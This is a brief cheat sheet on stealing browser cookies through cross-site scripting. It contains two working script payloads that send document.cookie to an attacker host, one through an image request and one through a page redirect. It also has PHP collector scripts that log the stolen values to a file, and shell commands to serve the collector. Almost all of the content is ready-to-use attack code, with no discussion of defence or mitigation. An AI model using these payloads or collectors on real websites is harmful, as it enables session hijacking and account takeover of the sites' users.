# Cookie Stealing via XSS

## Ex (1): 
```js
// One Liner: <script>new Image().src="http://attacker.site/log.php?q="+document.cookie</script>
<script>
  var i = new Image();
  i.src="http://attacker.site/log.php?q="+document.cookie;
</script>
```

## Attacker Controlled Site (1) (`log.php`):
```php
<?php
  $filename="/tmp/log.txt";
  $fp=fopen($filename, 'a');
  $cookie=$_GET['q'];

  fwrite($fp, $cookie);
  fclose($fp);
?>
```

-----

## Ex (2):
```js
<script>location.href='http://attacker.site/index.php?q='+document.cookie</script>
```


## Attacker Controlled Site (2) (`index.php`):
```php
<?php
  $cookie = isset($_GET['q']) ? $_GET['q']:"";
?>
```

```shell
$ service apache2 stop
$ php -S IP:80
```
